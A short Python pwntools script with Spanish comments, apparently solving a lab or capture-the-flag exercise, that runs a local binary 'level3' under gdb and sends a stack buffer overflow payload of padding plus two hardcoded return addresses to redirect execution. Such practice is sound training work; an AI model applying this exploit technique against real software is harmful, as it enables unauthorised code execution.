from pwn import *

# Crear una instacia de gdb con el programa.
io = gdb.debug('./level3')

# Pausar el debugger.
pause()

#Enumeracion de tamaño y direccion
size = 40   #32 del buffer + 8 rbp 
key = p64(0x0000555555555210)
escape = p64(0x00005555555551a9)


# Crear el payload con caracteres a desbordar
payload = b'A' * size
payload += key
payload += escape
# Mandar el payload al programa.
io.sendline(payload)

# Recibir el output del prorgrama.
output = io.recvall()

print(output)
















                                    